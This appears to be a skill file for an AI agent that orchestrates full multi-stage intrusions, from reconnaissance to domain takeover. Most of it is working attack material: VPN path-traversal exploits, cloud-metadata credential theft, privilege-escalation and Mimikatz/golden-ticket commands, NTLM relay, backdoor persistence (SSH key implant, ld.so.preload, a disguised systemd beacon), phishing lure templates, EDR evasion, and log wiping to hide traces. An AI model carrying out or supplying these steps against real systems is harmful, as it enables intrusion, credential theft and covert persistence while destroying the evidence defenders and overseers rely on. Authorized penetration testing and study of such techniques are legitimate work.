---
name: attack-chain-multistage
description: Multi-stage attack-path orchestrator. Plans and executes a full A-to-B kill chain, sequencing phases and coordinating sub-skills. Use when a finding needs to be combined with others into a complete chain rather than tested in isolation.
---

# Attack Chain Orchestration Skill

> The central commander for planning and executing multi-stage attack paths. When a task requires a complete "from A to B" kill chain, this Skill orchestrates the phases, coordinates sub-Skills, and plans the attack path.
> Not "red-team only" - any penetration scenario that requires combining multiple stages starts here.

---

## When to Route to This Skill

The following scenarios **must** go through this Skill first for full kill-chain planning, then be dispatched to specific sub-Skills for execution:

| Scenario | Why orchestration is needed |
|------|--------------|
| "Help me run a complete penetration test" | Requires planning the full workflow from reconnaissance to reporting |
| "Break in from the internet and reach the domain controller" | Spans multiple phases: perimeter breach → privilege escalation → lateral movement → AD |
| "Red vs. blue exercise" | Requires a full attack chain + stealth + trace cleanup |
| "Assess this target's attack surface" | Requires multi-dimensional reconnaissance + path planning |
| "I have a webshell, what's next?" | Requires planning subsequent paths from the current foothold |
| "Help me plan an attack path" | Explicitly requires path orchestration |
| "How far can I get with this vulnerability?" | Requires assessing the chained exploitation value of the vulnerability |
| "Continuous bug bounty monitoring" | Requires an automated multi-stage workflow |
| "Full internal-network penetration workflow" | Combines lateral movement + privilege escalation + domain attacks |
| "Near-source penetration plan" | Combines physical access + internal-network penetration |
| "Supply-chain attack path" | Cross-organization multi-hop attack |
| "Phishing + post-exploitation" | Combines initial access + subsequent exploitation |

**Single-stage tasks do not need to go through this Skill**:
- Port scanning only → go directly to `pentest-tools/`
- SQL injection only → go directly to `pentest-tools/`
- APK reversing only → go directly to `apk-reverse/`
- Domain penetration only → go directly to `pentest-tools/references/network-attack-defense.md`

---

## Orchestration Principles

### The Role of This Skill

```
User poses a multi-stage task
    ↓
attack-chain/SKILL.md (this file)
    ↓ Plan the attack path, determine phase ordering
    ↓ Assess the tools and methods required for each phase
    ↓
Dispatch to specific sub-Skills for execution:
    ├── pentest-tools/     → tool invocation, exploitation
    ├── apk-reverse/       → mobile penetration
    ├── js-reverse/        → web front-end breach
    ├── reverse-engineering/ → binary analysis
    ├── ida-reverse/       → deep reversing
    └── browser-automation/ → automated operations
    ↓
After each phase completes, return to this Skill to assess the next step
    ↓
All complete → docs-generator produces the report
```

### Path Planning Decision Tree

```
Once you have the target:
1. What is the target? (Web/internal network/cloud/mobile/IoT)
2. What do you currently have? (external viewpoint/existing credentials/existing foothold)
3. What is the final objective? (domain controller/data/a specific system/proving impact)
4. What are the constraints? (time/stealth/systems that must not be touched)
    ↓
Plan the shortest path based on the above
    ↓
A path is a dead end → return to this Skill and re-plan an alternative path
```

---

## Full Attack Chain Phases

---

## 1. Reconnaissance Phase

### 1.1 Enterprise Digital Asset Mapping

```bash
# Discover domains related to subsidiaries
subfinder -d target.com -o subdomains.txt
amass enum -d target.com -passive -o amass_results.txt

# Merge and deduplicate
cat subdomains.txt amass_results.txt | sort -u > all_subs.txt

# Liveness probing
httpx -l all_subs.txt -status-code -title -tech-detect -o alive.txt

# Port scanning (all ports)
naabu -l all_subs.txt -top-ports 1000 -o ports.txt
nmap -sV -sC -iL targets.txt -oA nmap_results
```

**Practical tips**:
- Use corporate-registry services (Qichacha/Tianyancha) to obtain the subsidiary list and expand the attack surface
- Pay attention to test environments (test., dev., staging.) and newly launched systems
- Use certificate transparency logs (crt.sh) to discover hidden domains

### 1.2 Hunting for Sensitive Information Leaks

```bash
# GitHub search
# org:Company filename:.env password
# org:Company filename:config.yml secret
# org:Company "jdbc:mysql" password

# Google Dork
# site:target.com filetype:sql
# site:target.com inurl:admin
# site:target.com ext:conf|cfg|ini

# API keys in JS files
cat js_urls.txt | while read url; do
  curl -s "$url" | grep -oP '(api[_-]?key|secret|token|password)\s*[:=]\s*["\047][^"\047]+'
done
```

**High-value targets**:
- Cloud service AK/SK (Alibaba Cloud, AWS, Azure)
- Database connection strings
- JWT keys
- Internal API documentation
- VPN/bastion-host credentials

### 1.3 Employee Profiling

**Social-engineering wordlist generation rules**:
```
{name pinyin}{year}       → zhangsan2024
{name initials}{department abbreviation}  → zs_dev
{employee ID}@{domain}          → 10086@target.com
{name}{common suffixes}       → zhangsan@123, zhangsan!@#
```

**Information sources**:
- Maimai/LinkedIn department structure
- Corporate WeChat accounts/official-site team introductions
- Recruitment postings (exposes the tech stack)
- Academic papers (exposes email addresses)

### 1.4 Technology Stack Fingerprinting

```bash
# Web fingerprinting
whatweb -i alive.txt --log-json=fingerprint.json
httpx -l alive.txt -tech-detect -json -o tech.json

# Probe for specific frameworks
nuclei -l alive.txt -tags tech -severity info -o tech_results.txt

# CMS identification
wpscan --url https://target.com --enumerate p,t,u
```

---

## 2. Initial Access Phase

### 2.1 Web Exploitation (High-Frequency Breach Points)

| Vulnerability type | Detection tool | Exploitation method |
|---------|---------|---------|
| SQL injection | sqlmap | Data extraction → write shell → OS commands |
| SSTI | sstimap | Template injection → RCE |
| File upload | manual + Burp | Webshell → reverse shell |
| Deserialization | ysoserial/marshalsec | Java/PHP/Python RCE |
| SSRF | manual | Internal probing → cloud metadata → AK/SK |
| Unauthorized access | nuclei | Spring Actuator / Nacos / Redis |
| XSS → Cookie | xsstrike | Administrator session hijacking |

```bash
# Automated SQL injection
sqlmap -u "https://target.com/api?id=1" --batch --dbs --random-agent

# SSTI detection
sstimap -u "https://target.com/search?q=test"

# Nuclei bulk scanning
nuclei -l alive.txt -severity critical,high -tags cve,sqli,rce -o vulns.txt
```

### 2.2 Supply-Chain Attack

**Attack path**:
1. Identify the third-party components/vendors the target uses
2. Attack the vendor to obtain code-signing/update-push privileges
3. Deliver the malicious payload through the legitimate update channel

**Common entry points**:
- Open-source component poisoning (npm/pip/maven)
- SaaS vendor API abuse
- Abuse of outsourced-personnel privileges
- Lateral penetration through shared IT service providers

### 2.3 Phishing Attack

**Email phishing**:
```
Subject templates:
- [Urgent] Your VPN certificate is about to expire, please update immediately
- [IT Notice] Mailbox storage is running low, please clean up
- [HR] Query results for the 2024 annual performance review
- [Finance] The reimbursement system has been upgraded, please log in again to confirm
```

**Payload types**:
- Office macro documents (.docm/.xlsm)
- LNK shortcuts (disguised as PDF)
- HTML Smuggling
- ISO/IMG images (bypassing MOTW)
- OneNote embedded scripts

**OAuth phishing** (new 2025 trend):
- Craft a malicious OAuth application requesting permissions
- After the user authorizes, obtain email/file access
- No password required, bypasses MFA

### 2.4 Near-Source Penetration (Physical Access)

| Technique | Tool | Effect |
|------|------|------|
| BadUSB | Rubber Ducky / WiFi Ducky | Keystroke injection → reverse shell |
| Malicious power bank | O.MG Cable | Backdoor implanted in a disguised data cable |
| WiFi phishing | Fluxion / WiFi Pineapple | Fake hotspot → credential capture |
| RFID cloning | Proxmark3 | Access-card copying → physical entry |
| Network implant | Raspberry Pi / LAN Turtle | Persistent internal-network access point |

```bash
# Fluxion WiFi phishing
fluxion  # Interactively select target AP → create fake hotspot → capture WPA password

# BadUSB linked with Cobalt Strike
# Inject a PowerShell downloader via USB → check in to C2
```

### 2.5 VPN/Remote-Access Breach

```bash
# Pulse Secure VPN (CVE-2019-11510)
curl -k "https://vpn.target.com/dana-na/../dana/html5acc/guacamole/../../../etc/passwd?/dana/html5acc/guacamole/"

# Fortinet VPN (CVE-2018-13379)
curl -k "https://vpn.target.com/remote/fgt_lang?lang=/../../../..//////////dev/cmdb/sslvpn_websession"

# Generic: password spraying
hydra -L users.txt -P passwords.txt vpn.target.com https-form-post
```

### 2.6 Cloud Service Breach

```bash
# AWS S3 bucket enumeration
aws s3 ls s3://target-bucket --no-sign-request

# Cloud metadata SSRF
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/

# Azure AD password spraying
# Use MSOLSpray / Spray tools
```

---

## 3. Privilege Escalation Phase

### 3.1 Windows Privilege Escalation

| Technique | Condition | Tool |
|------|------|------|
| Potato family | SeImpersonate privilege | SweetPotato / GodPotato / PrintSpoofer |
| Kernel vulnerabilities | Unpatched | watson / wesng detection |
| Service path hijacking | Unquoted service path | PowerUp |
| DLL hijacking | Writable DLL search path | Process Monitor |
| AlwaysInstallElevated | Registry configuration | msiexec installs a malicious MSI |
| Scheduled tasks | Writable task script | schtasks replacement |

```powershell
# Detect SeImpersonate
whoami /priv | findstr "SeImpersonate"

# Potato privilege escalation
.\GodPotato.exe -cmd "cmd /c whoami"

# Automated detection
.\winPEAS.exe
```

### 3.2 Linux Privilege Escalation

```bash
# SUID detection
find / -perm -4000 -type f 2>/dev/null

# sudo abuse
sudo -l
# Commonly exploitable: vim, find, python, nmap, less, awk, perl

# sudo vim privilege escalation
sudo vim -c ':!/bin/bash'

# sudo find privilege escalation
sudo find / -exec /bin/bash \;

# Kernel vulnerabilities
uname -r  # Check the version
# DirtyPipe (CVE-2022-0847), DirtyCow (CVE-2016-5195)

# Automated detection
./linpeas.sh
```

### 3.3 Database Privilege Escalation

```sql
-- MSSQL xp_cmdshell
EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
EXEC xp_cmdshell 'whoami';

-- MySQL UDF privilege escalation
CREATE FUNCTION sys_exec RETURNS INTEGER SONAME 'lib_mysqludf_sys.so';
SELECT sys_exec('id');

-- PostgreSQL
COPY (SELECT '') TO PROGRAM 'id';
```

### 3.4 Cloud Privilege Escalation

```bash
# AWS IAM enumeration
aws iam list-attached-user-policies --user-name compromised-user
# Look for iam:PassRole + lambda:CreateFunction → administrator privileges

# Azure AD
# Global Administrator → control of all subscriptions
# Application Administrator → add credentials to a service principal
```

---

## 4. Lateral Movement Phase

### 4.1 Credential Harvesting

```bash
# Mimikatz (Windows)
mimikatz# sekurlsa::logonpasswords
mimikatz# lsadump::dcsync /domain:target.local /user:krbtgt

# Linux credentials
cat /etc/shadow
cat ~/.bash_history | grep -i pass
find / -name "*.conf" -exec grep -l "password" {} \;

# NTLM hash extraction
secretsdump.py domain/user:password@dc_ip
```

### 4.2 Pass-the-Hash / Pass-the-Ticket

```bash
# PTH lateral movement
crackmapexec smb 10.0.0.0/24 -u administrator -H <NTLM_HASH> --exec-method smbexec

# Kerberoasting
GetUserSPNs.py -request -dc-ip 10.0.0.1 domain/user:password

# AS-REP Roasting
GetNPUsers.py domain/ -usersfile users.txt -no-pass -dc-ip 10.0.0.1

# Golden ticket
mimikatz# kerberos::golden /user:Administrator /domain:target.local /sid:S-1-5-21-... /krbtgt:<HASH> /ptt
```

### 4.3 Stealthy Lateral Movement Techniques

```bash
# WMI fileless execution
wmiexec.py domain/admin:password@target_ip "whoami"

# DCOM remote execution
dcomexec.py domain/admin:password@target_ip "whoami"

# WinRM
evil-winrm -i target_ip -u admin -H <NTLM_HASH>

# PsExec (leaves traces)
psexec.py domain/admin:password@target_ip

# SSH tunneling (Linux environment)
ssh -D 1080 user@pivot_host  # SOCKS proxy
ssh -L 3389:internal_host:3389 user@pivot_host  # port forwarding
```

### 4.4 NTLM Relay

```bash
# Disable Responder's SMB/HTTP
# Edit Responder.conf: SMB = Off, HTTP = Off

# Start Responder to capture
responder -I eth0

# NTLM Relay to the target
ntlmrelayx.py -tf targets.txt -smb2support

# Coercer to force authentication
coercer coerce -u user -p password -d domain -l attacker_ip -t dc_ip
```

### 4.5 AD Attack Paths

```bash
# BloodHound data collection
bloodhound-python -d domain.local -u user -p password -c All -ns dc_ip

# Common attack paths:
# 1. User → GenericAll → target user → reset password
# 2. User → WriteDacl → target OU → add privileges
# 3. Computer → constrained delegation → impersonate any user
# 4. User → DCSync privilege → export all hashes

# Certipy AD CS attack
certipy find -u user@domain -p password -dc-ip dc_ip
certipy req -u user@domain -p password -ca CA-NAME -template VulnTemplate
```

---

## 5. Persistence Phase

### 5.1 Windows Persistence

| Technique | Stealth | Detection difficulty |
|------|:---:|:---:|
| Scheduled task | Medium | Low |
| Registry Run key | Low | Low |
| WMI event subscription | High | High |
| DLL hijacking | High | Medium |
| Shadow account | Medium | Medium |
| Golden Ticket | Very high | Very high |
| DSRM backdoor | Very high | Very high |

```powershell
# WMI event subscription (highly stealthy)
$Filter = Set-WmiInstance -Class __EventFilter -Arguments @{
    Name = "CoreFilter"
    EventNameSpace = "root\cimv2"
    QueryLanguage = "WQL"
    Query = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"
}

# Shadow account
net user support$ P@ssw0rd /add /active:yes
net localgroup administrators support$ /add
# Modify the registry F value to clone the RID
```

### 5.2 Linux Persistence

```bash
# SSH key implant
echo "ssh-rsa AAAA..." >> /root/.ssh/authorized_keys

# Crontab backdoor
(crontab -l; echo "*/5 * * * * /tmp/.hidden/beacon") | crontab -

# LD_PRELOAD hijacking
echo "/tmp/.hidden/evil.so" > /etc/ld.so.preload

# PAM backdoor
# Modify pam_unix.so to add a master password

# Systemd service
cat > /etc/systemd/system/update.service << 'EOF'
[Unit]
Description=System Update Service
[Service]
ExecStart=/tmp/.hidden/beacon
Restart=always
[Install]
WantedBy=multi-user.target
EOF
systemctl enable update.service
```

### 5.3 Cloud Environment Persistence

```bash
# AWS Lambda backdoor
# Create a scheduled Lambda function that calls back to C2

# Azure AD application registration
# Create an application → add a key credential → grant Graph API permissions

# Container backdoor
# Modify the base image → every new container ships with the backdoor
```

---

## 6. EDR/AV Evasion

### 6.1 Core Evasion Approaches

| Layer | Technique | Description |
|------|------|------|
| Static detection | Encryption/obfuscation/custom loaders | Avoid signature matching |
| Behavioral detection | Indirect syscalls/Unhooking | Bypass API hooks |
| Memory detection | Module stomping/heap encryption | Avoid memory scanning |
| Network detection | Domain fronting/legitimate-service tunneling | Blend into normal traffic |
| Log detection | ETW patching/log clearing | Reduce traces |

### 6.2 Practical Evasion Techniques

```
1. Custom shellcode loaders (avoid public tools)
2. Direct syscall invocation (bypass ntdll hooks)
3. Inject into low-monitoring processes (e.g., RuntimeBroker.exe)
4. Route C2 traffic over HTTPS + domain fronting / Cloudflare Workers
5. Execute in memory, never touch disk (fileless)
6. Load via legitimately signed programs (LOLBins)
```

### 6.3 C2 Framework Selection

| Framework | Characteristics | Suitable scenario |
|------|------|---------|
| Cobalt Strike | Mature and stable, team collaboration | Large red-team operations |
| Sliver | Open source, written in Go | Limited budget |
| Havoc | Modern, modular | When customization is needed |
| Mythic | Multi-agent support | Cross-platform |
| AdaptixC2 | Included in Kali 2026.1 | Rapid deployment |

---

## 7. Anti-Forensics (Trace Cleanup)

```bash
# Windows log clearing
wevtutil cl Security
wevtutil cl System
wevtutil cl Application

# Linux log clearing
echo > /var/log/auth.log
echo > /var/log/syslog
history -c && history -w

# Timestamp modification
touch -t 202301010000 /path/to/file

# Memory cleanup
# Ensure the Mimikatz dump has been deleted
# Ensure the C2 beacon has exited
# Ensure temporary files have been removed
```

---

## Red-Team Operational Rules

### Three Bottom Lines

1. **All operations must have written authorization**
2. **Exfiltrated data must be anonymized**
3. **Clean up all attack traces (including in-memory residue)**

### Operational Discipline

- Assess the risk level before every operation (low/medium/high/critical)
- Notify the project manager before high-risk operations
- Keep an operation log (time, action, result)
- Report critical vulnerabilities immediately, do not expand exploitation
- Do not affect business availability (no DoS)
- Do not access/download real user data

### Typical Failure Cases

| Cause of failure | Consequence | Lesson |
|---------|------|------|
| Did not clear the Mimikatz memory dump | Blue team traced the full attack path | Clean up immediately after the operation |
| C2 domain flagged by threat intelligence | Blocked on the first connection | Use a newly registered domain + domain fronting |
| Phishing email triggered a DLP alert | Blue team got an early warning | Test the email gateway rules |
| Lateral movement tripped a honeypot | Attack intent exposed | Identify honeypots before acting |

---

## Tool Quick Reference

### Reconnaissance
`subfinder` `amass` `httpx` `naabu` `katana` `gau` `dnsx` `nmap` `whatweb` `wpscan`

### Exploitation
`nuclei` `sqlmap` `sstimap` `xsstrike` `burpsuite` `metasploit`

### Privilege Escalation
`winPEAS` `linpeas` `GodPotato` `PrintSpoofer` `watson`

### Lateral Movement
`mimikatz` `crackmapexec/netexec` `impacket` `bloodhound` `certipy` `coercer` `responder` `evil-winrm`

### C2 Frameworks
`cobalt-strike` `sliver` `havoc` `mythic` `adaptixc2`

### Near-Source Penetration
`fluxion` `aircrack-ng` `proxmark3` `rubber-ducky` `wifi-pineapple`

---

## Relationship with Other Skills in This Package

| Need | Route to |
|------|--------|
| In-depth Web exploitation | `pentest-tools/SKILL.md` |
| Detailed internal-network AD attack steps | `pentest-tools/references/network-attack-defense.md` |
| Reverse-engineering malware samples | `reverse-engineering/SKILL.md` |
| APK reversing (mobile penetration) | `apk-reverse/SKILL.md` |
| JS front-end signature bypass | `js-reverse/SKILL.md` |
| Automated mass penetration | Pentest Swarm AI (`pentestswarm scan --swarm`) |
| AI-assisted penetration | `mcp-kali-server` / `metasploitmcp` / `hexstrike-ai` |
| Report generation | `docs-generator/SKILL.md` |
| Attack path diagram | `diagram-generator/SKILL.md` |
